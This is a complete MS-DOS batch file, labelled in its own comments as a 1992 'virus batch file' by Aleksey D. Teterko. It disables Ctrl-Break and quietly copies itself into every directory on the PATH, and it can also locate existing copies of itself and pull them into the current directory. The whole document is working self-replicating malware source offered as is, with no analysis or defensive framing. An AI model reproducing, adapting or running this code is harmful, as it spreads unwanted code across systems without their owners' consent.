@echo off
rem Virus batch file that copies itself to all the directories
rem V0.01 Aleksey D. Teterko Tcherkassy 1992
rem V0.02 - Virus finds its copies
if "%1"=="+" goto find
if not "%1"=="" goto copy
 break off
if exist `.bat goto start
rem Copy batch file to current directory
 call ` + %path%
rem  Copy batch file from current directory to all others
:start
 call ` %path%
 break on
goto end
rem Find batch file
:find
 shift
if "%1"=="" goto end
if not exist %1\`.bat goto find
 copy %1\`.bat `.bat >nul
goto end
rem Copy batch file
:copy
 copy `.bat %1 >nul
 shift
if not "%1"=="" goto copy
:end
